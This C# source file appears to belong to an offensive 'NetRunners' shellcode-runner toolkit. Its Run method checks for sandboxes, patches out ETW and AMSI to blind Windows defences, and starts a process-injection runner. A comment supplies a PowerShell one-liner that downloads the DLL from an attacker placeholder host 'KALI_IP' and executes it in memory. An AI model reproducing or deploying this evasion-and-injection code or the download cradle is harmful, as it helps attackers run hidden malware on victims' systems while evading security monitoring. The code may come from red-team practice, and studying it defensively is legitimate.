using System;
using NetRunners.Heuristics;
using NetRunners.Interfaces;
using NetRunners.Patchers;
using NetRunners.Runners;

namespace NetRunners.Dll
{
    class Class1
    {
        /// <summary>
        /// Main function for this DLL. 
        /// Calls Heuristics and Amsi patch, then calls a runner (uncomment one and keep others commented.)
        /// </summary>
        /// <example>
        /// You can run this compiled managed DLL using this powershell one-liner:
        /// [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://KALI_IP/NetRunnersDll.dll')).GetType('NetRunnersDll.Class1').GetMethod('Run').Invoke(0, $null)
        /// </example>

        public static void Run()
        {
            if (!SleepHeuristic.Check() || !NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
            {
                return; // Exit if any checks fail or patching fails
            }

            // uncomment your choice
            IRunner runner = new ProcessInjectionRunner();
            //IRunner runner = new DefaultRunner();
            //IRunner runner = new ProcessInjectionRunner();
            runner.Run();
        }
    }
}
